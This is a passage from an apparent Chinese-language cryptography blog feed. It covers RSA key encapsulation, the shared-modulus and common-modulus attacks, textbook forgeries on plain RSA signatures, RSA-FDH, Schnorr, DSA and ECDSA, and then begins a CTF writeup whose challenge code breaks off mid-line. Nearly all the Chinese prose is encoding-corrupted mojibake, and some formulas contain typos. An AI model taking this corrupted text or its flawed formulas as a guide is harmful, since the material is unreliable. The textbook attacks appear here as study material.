</strong></p><p><strong>Gen</strong></p><ul><li>è¾“å…¥å®‰å…¨å‚æ•°$1^n$ã€‚</li><li>è¿è¡ŒRSAå¯†é’¥ç”Ÿæˆç®—æ³•$GenRSA(1^n)$ï¼Œå¾—åˆ°å…¬é’¥$(N,e)$å’Œç§é’¥$(N,d)$ã€‚</li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°$H:Z_N^âˆ—â€‹â†’{0,1}^n$ï¼Œè¯¥å‡½æ•°åœ¨åˆ†æä¸­è¢«å»ºæ¨¡ä¸ºéšæœºé¢„è¨€ã€‚</li></ul><p><strong>Encaps</strong></p><ul><li>è¾“å…¥å…¬é’¥$pk&#x3D;(N,e)$ã€‚</li><li>éšæœºé€‰æ‹©$râˆˆZ_N^âˆ—$â€‹ã€‚</li><li>è®¡ç®—å¯†æ–‡$c:&#x3D;[r^e\mod N]$å’Œå¯†é’¥$k:&#x3D;H(r)$ã€‚</li><li>è¾“å‡ºå¯†æ–‡$c$å’Œå¯†é’¥$k$ã€‚</li></ul><p><strong>Decaps</strong></p><ul><li>è¾“å…¥ç§é’¥$sk&#x3D;(N,d)$å’Œå¯†æ–‡$câˆˆZ_N^âˆ—$â€‹ã€‚</li><li>è®¡ç®—$r:&#x3D;[c^d\mod N]$ã€‚</li><li>è¾“å‡ºå¯†é’¥$k:&#x3D;H(r)$ã€‚</li></ul><p><strong>å®‰å…¨æ€§ï¼š</strong><br>åœ¨CCAæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æŸ¥è¯¢è§£å°è£…é¢„è¨€æœºï¼ˆDecapsulation Oracleï¼‰ï¼Œä½†è¿™äº›æŸ¥è¯¢ä¸ä¼šæ³„éœ²å…³äºå¯†é’¥$H(r)$çš„ä»»ä½•é¢å¤–ä¿¡æ¯ã€‚<br>è§£å°è£…é¢„è¨€æœºçš„æŸ¥è¯¢åªä¼šè¿”å›$(H)(\bar r)$ï¼Œå…¶ä¸­$\bar r&#x3D;[\bar c^d\mod N]$ã€‚å¦‚æœ$\bar c&#x3D;c$ï¼Œåˆ™$\bar r&#x3D;r$ï¼Œä½†$H(r)$ä»ç„¶æ˜¯éšæœºçš„ï¼Œå› ä¸º$H$æ˜¯éšæœºé¢„è¨€ã€‚<br>å› æ­¤ï¼Œå³ä½¿æ”»å‡»è€…å¯ä»¥æŸ¥è¯¢è§£å°è£…é¢„è¨€æœºï¼Œä¹Ÿæ— æ³•åŒºåˆ†æŒ‘æˆ˜å¯†æ–‡æ‰€å°è£…çš„å¯†é’¥$k$å’Œä¸€ä¸ªéšæœºå¯†é’¥ã€‚</p><h3 id="12-5-6-RSAçš„å®ç°é—®é¢˜å’Œé™·é˜±"><a href="#12-5-6-RSAçš„å®ç°é—®é¢˜å’Œé™·é˜±" class="headerlink" title="12.5.6 RSAçš„å®ç°é—®é¢˜å’Œé™·é˜±"></a>12.5.6 RSAçš„å®ç°é—®é¢˜å’Œé™·é˜±</h3><h4 id="ä½¿ç”¨CRTæ—¶çš„æ•…éšœæ”»å‡»"><a href="#ä½¿ç”¨CRTæ—¶çš„æ•…éšœæ”»å‡»" class="headerlink" title="ä½¿ç”¨CRTæ—¶çš„æ•…éšœæ”»å‡»"></a>ä½¿ç”¨CRTæ—¶çš„æ•…éšœæ”»å‡»</h4><p>å¦‚æœåœ¨è®¡ç®—è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼ˆä¾‹å¦‚ï¼Œæ”»å‡»è€…é€šè¿‡ç¡¬ä»¶ç¯¡æ”¹è¯±å¯¼é”™è¯¯ï¼‰ï¼Œå¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</p><h4 id="ä¾èµ–å…¬é’¥I"><a href="#ä¾èµ–å…¬é’¥I" class="headerlink" title="ä¾èµ–å…¬é’¥I"></a>ä¾èµ–å…¬é’¥I</h4><ul><li><strong>é—®é¢˜</strong>ï¼šå¤šä¸ªæ¥æ”¶è€…ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•°$N$ï¼Œä½†ä¸åŒçš„å…¬é’¥æŒ‡æ•°$e_i$å’Œç§é’¥æŒ‡æ•°$d_i$â€‹ã€‚</li><li><strong>æ”»å‡»</strong>ï¼šç»™å®š$N$å’Œ$e_iâ€‹â‹…d_iâ€‹&#x3D;1\mod Ï•(N)$ï¼Œå¯ä»¥é«˜æ•ˆåœ°åˆ†$N$ã€‚ä¸€æ—¦åˆ†è§£äº†$N$ï¼Œå°±å¯ä»¥è®¡ç®—ä»»ä½•$e_jâ€‹$çš„é€†å…ƒ$d_j$â€‹ã€‚</li><li><strong>åæœ</strong>ï¼šä»»ä½•å‘˜å·¥éƒ½å¯ä»¥è¯»å–å‘é€ç»™å…¶ä»–å‘˜å·¥çš„åŠ å¯†æ¶ˆæ¯ã€‚</li></ul><h4 id="ä¾èµ–å…¬é’¥II"><a href="#ä¾èµ–å…¬é’¥II" class="headerlink" title="ä¾èµ–å…¬é’¥II"></a>ä¾èµ–å…¬é’¥II</h4><ul><li><strong>é—®é¢˜</strong>ï¼šå³ä½¿æ‰€æœ‰å‘˜å·¥ç›¸äº’ä¿¡ä»»ï¼Œå…±äº«æ¨¡æ•°$N$ä»ç„¶ä¸å®‰å…¨ã€‚</li><li><strong>æ”»å‡»</strong>ï¼šå‡è®¾ç›¸åŒçš„æ˜æ–‡$m$è¢«åŠ å¯†å¹¶å‘é€ç»™ä¸¤ä¸ªå‘˜å·¥ï¼Œå…¶å…¬é’¥åˆ†åˆ«ä¸º$(N,e_1â€‹)$å’Œ$(N,e_2â€‹)$ï¼Œä¸”$gcd(e_1â€‹,e_2â€‹)&#x3D;1$</li><li><strong>æ”»å‡»æ–¹æ³•</strong>ï¼šæ”»å‡»è€…å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå¯†æ–‡$c_1â€‹&#x3D;m^{e_1}â€‹\mod N$å’Œ$c_2â€‹&#x3D;m^{e_2}â€‹\mod N$ã€‚åˆ©ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—æ•´æ•°$X$å’Œ$Y$ï¼Œä½¿å¾—$Xe_1â€‹+Ye_2â€‹&#x3D;1$ã€‚é‚£ä¹ˆ$m&#x3D;[c_1^Xâ€‹â‹…c_2^Yâ€‹\mod N]$ã€‚</li><li><strong>åæœ</strong>ï¼šæ”»å‡»è€…å¯ä»¥è½»æ¾æ¢å¤æ˜æ–‡$m$</li></ul><h1 id="13-æ•°æ®ç­¾åæ–¹æ¡ˆ"><a href="#13-æ•°æ®ç­¾åæ–¹æ¡ˆ" class="headerlink" title="13.æ•°æ®ç­¾åæ–¹æ¡ˆ"></a>13.æ•°æ®ç­¾åæ–¹æ¡ˆ</h1><h2 id="13-1-æ¦‚è¿°"><a href="#13-1-æ¦‚è¿°" class="headerlink" title="13.1 æ¦‚è¿°"></a>13.1 æ¦‚è¿°</h2><p>æ•°å­—ç­¾åæ˜¯ä¸€ç§å…¬é’¥å¯†ç å­¦å·¥å…·ï¼Œå…è®¸ç­¾åè€…$S$ä½¿ç”¨å…¶ç§é’¥$sk$å¯¹æ¶ˆæ¯$m$è¿›è¡Œç­¾åï¼Œç”Ÿæˆç­¾å$Ïƒ$ã€‚ä»»ä½•çŸ¥é“ç­¾åè€…å…¬é’¥$pk$çš„äººéƒ½å¯ä»¥éªŒè¯ç­¾åçš„åˆæ³•æ€§ï¼Œä»è€Œç¡®è®¤æ¶ˆæ¯ç¡®å®ç”±ç­¾åè€…ç”Ÿæˆä¸”æœªè¢«ç¯¡æ”¹ã€‚</p><h3 id="ä¸MACçš„æ¯”è¾ƒ"><a href="#ä¸MACçš„æ¯”è¾ƒ" class="headerlink" title="ä¸MACçš„æ¯”è¾ƒ"></a>ä¸MACçš„æ¯”è¾ƒ</h3><p><strong>MACå±€é™æ€§ï¼š</strong> æ— æ³•å®ç°å…¬å¼€éªŒè¯ã€ä¸å¯æŠµèµ–æ€§ å’Œç­¾åçš„å¯è½¬ç§»æ€§ã€‚<br><strong>æ•°å­—ç­¾åä¼˜åŠ¿ï¼š</strong></p><ul><li><strong>å…¬å¼€éªŒè¯</strong>ï¼šä»»ä½•çŸ¥é“å…¬é’¥çš„äººéƒ½å¯ä»¥éªŒè¯ç­¾åã€‚</li><li><strong>ä¸å¯æŠµèµ–æ€§</strong>ï¼šç­¾åè€…æ— æ³•å¦è®¤è‡ªå·±å¯¹æ¶ˆæ¯çš„ç­¾åã€‚</li><li><strong>å¯è½¬ç§»æ€§</strong>ï¼šç­¾åå¯ä»¥è¢«ç¬¬ä¸‰æ–¹éªŒè¯ï¼Œå¹¶å¯è¿›ä¸€æ­¥ä¼ é€’ç»™å…¶ä»–æ–¹ã€‚</li></ul><h3 id="ä¸å…¬é’¥åŠ å¯†çš„è”ç³»"><a href="#ä¸å…¬é’¥åŠ å¯†çš„è”ç³»" class="headerlink" title="ä¸å…¬é’¥åŠ å¯†çš„è”ç³»"></a>ä¸å…¬é’¥åŠ å¯†çš„è”ç³»</h3><p><strong>è¯¯è§£</strong>ï¼šæ•°å­—ç­¾åæœ‰æ—¶è¢«é”™è¯¯åœ°è§†ä¸ºå…¬é’¥åŠ å¯†çš„â€œé€†æ“ä½œâ€ï¼Œå³é€šè¿‡ç§é’¥è§£å¯†æ¶ˆæ¯æ¥ç”Ÿæˆç­¾åï¼Œé€šè¿‡å…¬é’¥åŠ å¯†ç­¾åæ¥éªŒè¯ã€‚è¿™ç§è§‚ç‚¹æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºï¼š</p><ul><li><strong>ä¸é€‚ç”¨æ€§</strong>ï¼šåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•æ ¹æœ¬ä¸å¯è¡Œã€‚</li><li><strong>ä¸å®‰å…¨æ€§</strong>ï¼šå³ä½¿åœ¨å¯ä»¥åº”ç”¨çš„æƒ…å†µä¸‹ï¼Œç”Ÿæˆçš„ç­¾åæ–¹æ¡ˆä¹Ÿä¸å®‰å…¨ã€‚<br><strong>æ­£ç¡®å…³ç³»</strong>ï¼šæ•°å­—ç­¾åå’Œå…¬é’¥åŠ å¯†æ˜¯ä¸¤ç§ä¸åŒçš„å¯†ç å­¦åŸè¯­ï¼Œå°½ç®¡å®ƒä»¬éƒ½åŸºäºå…¬é’¥å¯†ç å­¦ï¼Œä½†å®ƒä»¬çš„è®¾è®¡å’Œå®‰å…¨æ€§è¦æ±‚ä¸åŒã€‚</li></ul><h2 id="13-2å®šä¹‰"><a href="#13-2å®šä¹‰" class="headerlink" title="13.2å®šä¹‰"></a>13.2å®šä¹‰</h2><h3 id="ç­¾åæ–¹æ¡ˆçš„å®‰å…¨æ€§"><a href="#ç­¾åæ–¹æ¡ˆçš„å®‰å…¨æ€§" class="headerlink" title="ç­¾åæ–¹æ¡ˆçš„å®‰å…¨æ€§"></a>ç­¾åæ–¹æ¡ˆçš„å®‰å…¨æ€§</h3><p>æ•°å­—ç­¾åæ–¹æ¡ˆçš„å®‰å…¨æ€§è¦æ±‚æ”»å‡»è€…æ— æ³•ä¼ªé€ ç­¾åï¼Œå³ä½¿å®ƒå·²ç»è·å¾—äº†è®¸å¤šå…¶ä»–æ¶ˆæ¯çš„ç­¾åã€‚</p><h2 id="13-3-hashç­¾åæ–¹æ¡ˆ"><a href="#13-3-hashç­¾åæ–¹æ¡ˆ" class="headerlink" title="13.3 hashç­¾åæ–¹æ¡ˆ"></a>13.3 hashç­¾åæ–¹æ¡ˆ</h2><p><strong>æ„é€ ï¼š</strong><br>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç­¾åæ–¹æ¡ˆ$Î &#x3D;(Gen,Sign,Vrfy)$ï¼Œå®ƒé€‚ç”¨äºé•¿åº¦ä¸º$â„“(n)$çš„æ¶ˆæ¯ï¼Œä»¥åŠä¸€ä¸ªå“ˆå¸Œå‡½æ•° $Î _Hâ€‹&#x3D;(Gen_Hâ€‹,H)$ï¼Œå…¶è¾“å‡ºé•¿åº¦ä¸º â„“(n)ã€‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªæ–°çš„ç­¾åæ–¹æ¡ˆ$Î â€²&#x3D;(Genâ€²,Signâ€²,Vrfyâ€²)$ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><strong>Genâ€™ï¼š</strong></p><ul><li>è¾“å…¥ï¼šå®‰å…¨å‚æ•°$1^n$ã€‚</li><li>è¿è¡Œ$Gen(1^n)$ç”Ÿæˆå¯†é’¥å¯¹$(pk,sk)$ã€‚</li><li>è¿è¡Œ$Gen_Hâ€‹(1^n)$ç”Ÿæˆå“ˆå¸Œå‡½æ•°çš„å‚æ•°$s$ã€‚</li><li>å…¬é’¥ä¸º$âŸ¨pk,sâŸ©$ï¼Œç§é’¥ä¸º$âŸ¨sk,sâŸ©$ã€‚</li></ul><p><strong>Signâ€˜ï¼š</strong></p><ul><li>è¾“å…¥ï¼šç§é’¥$âŸ¨sk,sâŸ©$å’Œæ¶ˆæ¯$mâˆˆ{0,1}^âˆ—$ã€‚</li><li>è®¡ç®—å“ˆå¸Œå€¼$H_sâ€‹(m)$ã€‚</li><li>ä½¿ç”¨ç§é’¥$sk$å¯¹å“ˆå¸Œå€¼$H_sâ€‹(m)$è¿›è¡Œç­¾åï¼Œå¾—åˆ°ç­¾å$Ïƒâ†Sign_{sk}â€‹(H_sâ€‹(m))$</li><li>è¾“å‡ºç­¾å$Ïƒ$ã€‚</li></ul><p><strong>Vrfyâ€™</strong></p><ul><li>è¾“å…¥ï¼šå…¬é’¥$âŸ¨pk,sâŸ©$ã€æ¶ˆæ¯$mâˆˆ{0,1}^âˆ—$å’Œç­¾å$Ïƒ$ã€‚</li><li>è®¡ç®—å“ˆå¸Œå€¼$H_sâ€‹(m)$ã€‚</li><li>ä½¿ç”¨å…¬é’¥$pk$éªŒè¯ç­¾å$Ïƒ$æ˜¯å¦æ˜¯$Hsâ€‹(m)$çš„æœ‰æ•ˆç­¾åï¼Œå³æ£€æŸ¥$Vrfy_{pk}â€‹(H_sâ€‹(m),Ïƒ)&#x3D;1$ã€‚</li><li>å¦‚æœéªŒè¯é€šè¿‡ï¼Œè¾“å‡º1ï¼ˆæœ‰æ•ˆï¼‰ï¼›å¦åˆ™è¾“å‡º0ï¼ˆæ— æ•ˆï¼‰ã€‚</li></ul><p><strong>å®šç†13.4</strong>ï¼šå¦‚æœ$Î $æ˜¯ä¸€ä¸ªå®‰å…¨çš„ç­¾åæ–¹æ¡ˆï¼ˆé€‚ç”¨äºé•¿åº¦ä¸º â„“ çš„æ¶ˆæ¯ï¼‰ï¼Œå¹¶ä¸”$Î _H$æ˜¯æŠ—ç¢°æ’æ€§çš„ï¼Œé‚£ä¹ˆä¸Šé¢æ„é€ å°±æ˜¯ä¸€ä¸ªå®‰å…¨çš„ç­¾åæ–¹æ¡ˆï¼ˆé€‚ç”¨äºä»»æ„é•¿åº¦çš„æ¶ˆæ¯ï¼‰</p><h2 id="13-4-åŸºäºRSAçš„ç­¾å"><a href="#13-4-åŸºäºRSAçš„ç­¾å" class="headerlink" title="13.4 åŸºäºRSAçš„ç­¾å"></a>13.4 åŸºäºRSAçš„ç­¾å</h2><h3 id="13-4-1æ™®é€šRSAç­¾å"><a href="#13-4-1æ™®é€šRSAç­¾å" class="headerlink" title="13.4.1æ™®é€šRSAç­¾å"></a>13.4.1æ™®é€šRSAç­¾å</h3><h4 id="æ— æ¶ˆæ¯æ”»å‡»"><a href="#æ— æ¶ˆæ¯æ”»å‡»" class="headerlink" title="æ— æ¶ˆæ¯æ”»å‡»"></a>æ— æ¶ˆæ¯æ”»å‡»</h4><p>æ”»å‡»è€…å¯ä»¥é€‰æ‹©ä¸€ä¸ªéšæœºçš„$ÏƒâˆˆZ_N^âˆ—$â€‹ï¼Œè®¡ç®—$m:&#x3D;[Ïƒ^e\mod N]$ï¼Œç„¶åè¾“å‡ºä¼ªé€ çš„ç­¾åå¯¹$(m,Ïƒ)$ã€‚è¿™ç§æ”»å‡»æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸º$Ïƒ$æ˜¯$m$çš„æœ‰æ•ˆç­¾åã€‚</p><h4 id="ä»»æ„æ¶ˆæ¯ä¸Šçš„ç­¾å"><a href="#ä»»æ„æ¶ˆæ¯ä¸Šçš„ç­¾å" class="headerlink" title="ä»»æ„æ¶ˆæ¯ä¸Šçš„ç­¾å"></a>ä»»æ„æ¶ˆæ¯ä¸Šçš„ç­¾å</h4><p>æ”»å‡»è€…å¯ä»¥é€‰æ‹©ä¸¤ä¸ªæ¶ˆæ¯$m_1â€‹,m_2â€‹âˆˆZ_N^âˆ—$â€‹ï¼Œä½¿å¾—$m&#x3D;m_1â€‹â‹…m_2 \mod N$ã€‚ç„¶åè·å–$m_1â€‹$å’Œ$m_2â€‹$çš„ç­¾å$Ïƒ1â€‹,Ïƒ2$â€‹ï¼Œå¹¶è¾“å‡º$Ïƒ:&#x3D;[Ïƒ_1â€‹â‹…Ïƒ_2 \mod N]$ä½œä¸º$m$çš„ç­¾åã€‚è¿™ç§æ”»å‡»ä¹Ÿæ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºï¼š<br>$Ïƒ^e&#x3D;(Ïƒ^1â€‹â‹…Ïƒ_2â€‹)^e&#x3D;(m_1^dâ€‹â‹…m_2^dâ€‹)^e&#x3D;m_1â€‹â‹…m_2â€‹&#x3D;m\mod N$</p><h3 id="13-4-2-RSA-FDH-å’ŒPKCS-1æ ‡å‡†"><a href="#13-4-2-RSA-FDH-å’ŒPKCS-1æ ‡å‡†" class="headerlink" title="13.4.2 RSA-FDH å’ŒPKCS #1æ ‡å‡†"></a>13.4.2 RSA-FDH å’ŒPKCS #1æ ‡å‡†</h3><p><strong>æ„é€ ï¼š</strong><br><strong>Gen</strong>ï¼š</p><ul><li>è¾“å…¥å®‰å…¨å‚æ•°$1^n$ã€‚    </li><li>è¿è¡Œ$GenRSA(1^n)$ç”Ÿæˆæ¨¡æ•°$N$å’Œæ•´æ•°$e,d$ï¼Œæ»¡è¶³$ed&#x3D;1modÏ•(N)$ã€‚ </li><li>å…¬é’¥ä¸º$pk&#x3D;(N,e)$ï¼Œç§é’¥ä¸º$sk&#x3D;(N,d)$ã€‚</li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°$H:{0,1}âˆ—â†’Z_N^âˆ—â€‹$</li></ul><p><strong>Sign</strong>ï¼š</p><ul><li>è¾“å…¥ç§é’¥$sk&#x3D;(N,d)$å’Œæ¶ˆæ¯$mâˆˆ{0,1}^âˆ—$ã€‚    </li><li>è®¡ç®—ç­¾å$Ïƒ:&#x3D;[H(m)^d\mod N]$ã€‚</li></ul><p><strong>Vrfy</strong>ï¼š</p><ul><li>è¾“å…¥å…¬é’¥$pk&#x3D;(N,e)$ã€æ¶ˆæ¯$m$å’Œç­¾å$Ïƒ$ã€‚ </li><li>éªŒè¯æ˜¯å¦$Ïƒ^e&#x3D;H(m)\mod N$</li></ul><h4 id="RSA-PKCS-1æ ‡å‡†"><a href="#RSA-PKCS-1æ ‡å‡†" class="headerlink" title="RSA PKCS #1æ ‡å‡†"></a>RSA PKCS #1æ ‡å‡†</h4><ul><li><strong>PKCS #1 v1.5</strong>ï¼šä¸RSA-FDHéå¸¸ç›¸ä¼¼ï¼Œä½†å­˜åœ¨ä¸€äº›å·²çŸ¥çš„å®‰å…¨æ€§é—®é¢˜ã€‚</li><li><strong>PKCS #1 v2.1</strong>ï¼šåŒ…å«ä¸€ä¸ªæ›´å¤æ‚çš„æ–¹æ¡ˆï¼Œå¯ä»¥è§†ä¸ºRSA-FDHçš„éšæœºåŒ–å˜ä½“ã€‚</li></ul><h2 id="13-5ç¦»æ•£å¯¹æ•°é—®é¢˜çš„ç­¾å"><a href="#13-5ç¦»æ•£å¯¹æ•°é—®é¢˜çš„ç­¾å" class="headerlink" title="13.5ç¦»æ•£å¯¹æ•°é—®é¢˜çš„ç­¾å"></a>13.5ç¦»æ•£å¯¹æ•°é—®é¢˜çš„ç­¾å</h2><h3 id="13-5-1æ ‡è¯†æ–¹æ¡ˆå’Œç­¾å"><a href="#13-5-1æ ‡è¯†æ–¹æ¡ˆå’Œç­¾å" class="headerlink" title="13.5.1æ ‡è¯†æ–¹æ¡ˆå’Œç­¾å"></a>13.5.1æ ‡è¯†æ–¹æ¡ˆå’Œç­¾å</h3><h4 id="è¯†åˆ«æ–¹æ¡ˆ"><a href="#è¯†åˆ«æ–¹æ¡ˆ" class="headerlink" title="è¯†åˆ«æ–¹æ¡ˆ"></a>è¯†åˆ«æ–¹æ¡ˆ</h4><p>è¯†åˆ«æ–¹æ¡ˆæ˜¯ä¸€ç§äº¤äº’å¼åè®®ï¼Œå…è®¸ä¸€æ–¹ï¼ˆç§°ä¸ºâ€œè¯æ˜è€…â€ï¼‰å‘å¦ä¸€æ–¹ï¼ˆç§°ä¸ºâ€œéªŒè¯è€…â€ï¼‰è¯æ˜å…¶èº«ä»½ã€‚</p><h4 id="ä»è¯†åˆ«æ–¹æ¡ˆåˆ°ç­¾å"><a href="#ä»è¯†åˆ«æ–¹æ¡ˆåˆ°ç­¾å" class="headerlink" title="ä»è¯†åˆ«æ–¹æ¡ˆåˆ°ç­¾å"></a>ä»è¯†åˆ«æ–¹æ¡ˆåˆ°ç­¾å</h4><p><strong>Fiat-Shamirå˜æ¢ï¼š</strong></p><ul><li><strong>å˜æ¢æ–¹æ³•</strong>ï¼šFiat-Shamirå˜æ¢å¯ä»¥å°†ä»»ä½•äº¤äº’å¼çš„è¯†åˆ«æ–¹æ¡ˆè½¬æ¢ä¸ºéäº¤äº’å¼çš„ç­¾åæ–¹æ¡ˆã€‚</li><li><strong>åŸºæœ¬æ€æƒ³</strong>ï¼šç­¾åè€…ä½œä¸ºè¯æ˜è€…ï¼Œè‡ªå·±è¿è¡Œè¯†åˆ«åè®®ã€‚ç­¾åè€…é¦–å…ˆè®¡ç®—åˆå§‹æ¶ˆæ¯$I$ï¼Œç„¶åé€šè¿‡å“ˆå¸Œå‡½æ•°$H$ç”ŸæˆæŒ‘æˆ˜$r$ï¼Œæœ€åè®¡ç®—å“åº”$s$ã€‚ç­¾åæ˜¯$(r,s)$</li><li><strong>éªŒè¯è¿‡ç¨‹</strong>ï¼šéªŒè¯è€…é‡æ–°è®¡ç®— I å¹¶æ£€æŸ¥$H(I,m)&#x3D;r$ã€‚</li></ul><h3 id="13-5-2-Schnorr-èº«ä»½è¯†åˆ«-ç­¾åæ–¹æ¡ˆ"><a href="#13-5-2-Schnorr-èº«ä»½è¯†åˆ«-ç­¾åæ–¹æ¡ˆ" class="headerlink" title="13.5.2 Schnorr èº«ä»½è¯†åˆ«&#x2F;ç­¾åæ–¹æ¡ˆ"></a>13.5.2 Schnorr èº«ä»½è¯†åˆ«&#x2F;ç­¾åæ–¹æ¡ˆ</h3><p><strong>æ„é€ </strong>ï¼š</p><p><strong>Gen</strong>ï¼šä¸è¯†åˆ«æ–¹æ¡ˆç›¸åŒã€‚   </p><p><strong>Sign</strong>ï¼š    </p><ul><li>é€‰æ‹©éšæœº$kâˆˆZ_qâ€‹$ï¼Œè®¡ç®—$I&#x3D;g^k$ã€‚</li><li>è®¡ç®—$r&#x3D;H(I,m)$</li><li>è®¡ç®—$s&#x3D;[rx+k\mod q]$ã€‚    </li><li>è¾“å‡ºç­¾å$(r,s)$ã€‚</li></ul><p><strong>Vrfy</strong>ï¼š   </p><ul><li>è®¡ç®—$I&#x3D;g^sâ‹…y^{âˆ’r}$ã€‚</li><li>æ£€æŸ¥æ˜¯å¦$H(I,m)&#x3D;r$ã€‚</li></ul><p><strong>å®‰å…¨æ€§</strong>ï¼šå¦‚æœç¦»æ•£å¯¹æ•°é—®é¢˜æ˜¯å›°éš¾çš„ï¼Œå¹¶ä¸”å“ˆå¸Œå‡½æ•° H è¢«å»ºæ¨¡ä¸ºéšæœºé¢„è¨€ï¼Œé‚£ä¹ˆSchnorrç­¾åæ–¹æ¡ˆæ˜¯å®‰å…¨çš„ã€‚</p><h3 id="13-5-3-DSAå’ŒECDSA"><a href="#13-5-3-DSAå’ŒECDSA" class="headerlink" title="13.5.3 DSAå’ŒECDSA"></a>13.5.3 DSAå’ŒECDSA</h3><h4 id="DSAæ„é€ "><a href="#DSAæ„é€ " class="headerlink" title="DSAæ„é€ "></a>DSAæ„é€ </h4><p><strong>Gen</strong>ï¼š<br>è¿è¡Œ$G(1^n)$ç”Ÿæˆç¾¤$G$ã€é˜¶$q$å’Œç”Ÿæˆå…ƒ$g$ã€‚é€‰æ‹©éšæœº$xâˆˆZ_q$â€‹ï¼Œè®¡ç®—$y&#x3D;g^x$ã€‚å…¬é’¥ä¸º$(G,q,g,y)$ï¼Œç§é’¥ä¸º$x$ã€‚</p><p> <strong>Sign</strong>ï¼š   </p><ul><li>é€‰æ‹©éšæœº$kâˆˆZ_q^âˆ—$â€‹ï¼Œè®¡ç®—$r&#x3D;F(g^k)$ã€‚   </li><li>è®¡ç®—$s&#x3D;[k^{âˆ’1}â‹…(H(m)+xr)\mod q]$ã€‚</li><li>è¾“å‡ºç­¾å$(r,s)$ã€‚</li></ul><p><strong>Vrfy</strong>ï¼š</p><ul><li>è®¡ç®—$I&#x3D;g^{H(m)â‹…s^{âˆ’1}}â‹…y^{râ‹…s^{âˆ’1}}$ã€‚</li><li>æ£€æŸ¥æ˜¯å¦$r&#x3D;F(I)$</li></ul><h4 id="ECDSAæ„é€ "><a href="#ECDSAæ„é€ " class="headerlink" title="ECDSAæ„é€ "></a>ECDSAæ„é€ </h4><p> <strong>Gen</strong>ï¼šä¸DSAç›¸åŒï¼Œä½†ç¾¤$G$æ˜¯æ¤­åœ†æ›²çº¿ç¾¤ã€‚</p><p> <strong>Sign</strong>ï¼š</p><ul><li>é€‰æ‹©éšæœº$kâˆˆZ_q^âˆ—$â€‹ï¼Œè®¡ç®—$r&#x3D;F(g^k)$ã€‚</li><li>è®¡ç®—$s&#x3D;[k^{âˆ’1}â‹…(H(m)+xr)\mod q]$ã€‚    </li><li>è¾“å‡ºç­¾å$(r,s)$ã€‚</li></ul><p><strong>Vrfy</strong>ï¼š   </p><ul><li>è®¡ç®—$I&#x3D;g^{H(m)â‹…s^{âˆ’1}}â‹…y^{râ‹…s^{âˆ’1}}$ã€‚    </li><li>æ£€æŸ¥æ˜¯å¦$r&#x3D;F(I)$ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>å¯†ç </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF 2025 Writeup</title>
    <link href="/2025/04/16/XYCTF%202025%20Writeup/"/>
    <url>/2025/04/16/XYCTF%202025%20Writeup/</url>
    
    <content type="html"><![CDATA[<p>XYCTF 2025èµ›é¢˜å¤ç°</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Complex</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, re, im</span>):<br>        <span class="hljs-variable language_">self</span>.re = re<br>        <span class="hljs-variable language_">self</span>.im = im<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, c</span>):<br>        re_ = <span class="hljs-variable language_">self</span>.re * c.re - <span class="hljs-variable language_">self</span>.im * c.im<br>        im_ = <span class="hljs-variable language_">self</span>.re * c.im + <span 